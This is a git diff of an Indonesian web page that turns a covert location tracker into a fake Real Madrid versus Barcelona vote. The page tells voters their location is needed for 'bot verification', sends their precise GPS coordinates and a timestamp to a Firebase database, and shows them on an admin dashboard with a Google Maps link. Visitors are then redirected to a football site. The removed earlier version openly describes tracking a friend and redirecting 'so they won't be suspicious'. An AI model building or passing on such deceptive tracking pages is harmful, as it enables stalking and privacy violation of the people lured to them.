@@ -2,75 +2,89 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>website pertama saya</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Poling Terbesar Abad Ini</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f4f4; }
-        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-block; margin-top: 50px; }
-        .btn-maps { background: #4285F4; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; }
+        body { font-family: 'Arial', sans-serif; text-align: center; background: #1a1a1a; color: white; padding: 20px; }
+        .card { background: #2a2a2a; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: inline-block; width: 100%; max-width: 400px; margin-top: 30px; }
+        .btn-box { display: flex; justify-content: space-around; margin-top: 25px; }
+        .btn { padding: 15px 20px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; width: 45%; transition: 0.3s; color: white; }
+        .madrid { background: #00468c; border: 2px solid white; }
+        .barca { background: #a50044; border: 2px solid #edbb00; }
+        .btn:hover { transform: scale(1.1); }
+        .admin-box { background: #fff; color: #333; padding: 15px; border-radius: 10px; margin-top: 20px; display: none; }
     </style>
 </head>
 <body>
 
-    <div id="konten" class="card">
-        <h2>Memuat...</h2>
+    <div class="card">
+        <div id="pilih-box">
+            <h2>VOTE TIM FAVORITMU!</h2>
+            <p>TIM FAVORITMU YANG MANA ?</p>
+            <div class="btn-box">
+                <button class="btn madrid" onclick="pilih('Real Madrid')">REAL MADRID</button>
+                <button class="btn barca" onclick="pilih('Barcelona')">BARCELONA</button>
+            </div>
+        </div>
+
+        <div id="admin-view" style="display: none; color: black; background: white; padding: 15px; border-radius: 10px;">
+            <h3>Dashboard Admin</h3>
+            <div id="data-lokasi">Menunggu data...</div>
+        </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
         import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
 
-        // 1. KONFIGURASI FIREBASE (Ganti dengan milikmu)
+        // --- PENTING: GANTI DENGAN URL FIREBASE KAMU ---
         const firebaseConfig = {
-            databaseURL: "URL_DATABASE_FIREBASE_KAMU"
+            databaseURL: "https://PROYEK-KAMU.firebasedatabase.app" 
         };
 
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
-        const linkRef = ref(db, 'lokasi_terakhir/');
+        const linkRef = ref(db, 'laporan_voter/');
 
-        // 2. LOGIKA ROUTING (Cek apakah ada ?mode=admin di URL)
-        const urlParams = new URLSearchParams(window.location.search);
-        const isAdmin = urlParams.get('mode') === 'admin';
-
+        // Cek jika masuk sebagai admin (?mode=admin)
+        const isAdmin = new URLSearchParams(window.location.search).get('mode') === 'admin';
         if (isAdmin) {
-            // --- MODE ADMIN: Memantau Lokasi ---
-            document.querySelector('h2').innerText = "Dashboard Admin";
+            document.getElementById('pilih-box').style.display = 'none';
+            document.getElementById('admin-view').style.display = 'block';
             onValue(linkRef, (snapshot) => {
                 const data = snapshot.val();
-                if (data) {
-                    document.getElementById("konten").innerHTML = `
-                        <h3>Lokasi Teman Ditemukan!</h3>
-                        <p>Waktu: ${data.waktu}</p>
-                        <p>Koordinat: ${data.lat}, ${data.lon}</p>
-                        <br><br>
-                        <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="btn-maps">Buka di Google Maps</a>
+                if(data) {
+                    document.getElementById('data-lokasi').innerHTML = `
+                        <p><b>Tim Dipilih:</b> ${data.pilihan}</p>
+                        <p><b>Waktu:</b> ${data.waktu}</p>
+                        <hr>
+                        <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" style="color: blue;">KLIK LIHAT LOKASI DI PETA</a>
                     `;
-                } else {
-                    document.getElementById("konten").innerHTML = "Belum ada data lokasi.";
                 }
             });
+        }
 
-        } else {
-            // --- MODE TEMAN: Melacak Lokasi ---
-            document.querySelector('h2').innerText = "Silakan Tunggu...";
+        // Fungsi saat tombol ditekan
+        window.pilih = function(namaTim) {
+            alert("Terima kasih sudah memilih! Izinkan akses lokasi untuk verifikasi bot.");
             
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
                     // Simpan data ke Firebase
                     set(linkRef, {
+                        pilihan: namaTim,
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         waktu: new Date().toLocaleString()
                     }).then(() => {
-                        document.getElementById("konten").innerHTML = "<h3>Koneksi Berhasil!</h3><p>Mengalihkan...</p>";
-                        // Opsional: Pindahkan teman ke Google agar tidak curiga
-                        setTimeout(() => window.location.href = "https://www.google.com", 2000);
+                        alert("Pilihanmu berhasil dikirim!");
+                        window.location.href = "https://www.laliga.com"; // Alihkan ke web bola
                     });
                 }, (err) => {
-                    document.getElementById("konten").innerHTML = "<h3>Error</h3><p>Mohon izinkan akses lokasi.</p>";
-                });
+                    alert("Gagal kirim: Mohon aktifkan GPS & Izinkan Lokasi");
+                }, {enableHighAccuracy: true});
             } else {
-                document.getElementById("konten").innerHTML = "Browser tidak mendukung GPS.";
+                alert("Browser tidak mendukung GPS");
             }
         }
     </script>
